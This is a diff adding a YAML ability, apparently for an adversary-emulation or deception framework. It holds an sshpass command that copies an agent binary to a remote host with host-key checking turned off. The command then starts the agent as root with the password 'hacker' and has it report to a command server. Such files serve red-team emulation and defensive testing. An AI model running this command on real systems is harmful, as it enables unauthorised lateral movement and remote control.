@@ -1,0 +1,22 @@
+---
+
+- id: deception-ssh-root
+  name: Deception copy and start agent with root over ssh
+  description: Copy 54ndc47 to remote host and start it with root password 'hacker', assumes target uses password enabled SSH
+  tactic: deception
+  technique:
+    attack_id: T1021.004
+    name: "Remote Services: SSH"
+  platforms:
+    linux:
+      sh:
+        command: 'sshpass -p "#{remote.ssh.password}" scp -o StrictHostKeyChecking=no
+          -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.dest}:~/sandcat.go
+          &&
+          sshpass -p "#{remote.ssh.password}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+          -o ConnectTimeout=3 #{remote.ssh.dest} ''echo 'hacker' | sudo -S nohup ./sandcat.go -server #{server}
+          -group red 1>/dev/null 2>/dev/null &'''
+        cleanup:
+        payloads:
+        - sandcat.go-linux
+  singleton: true
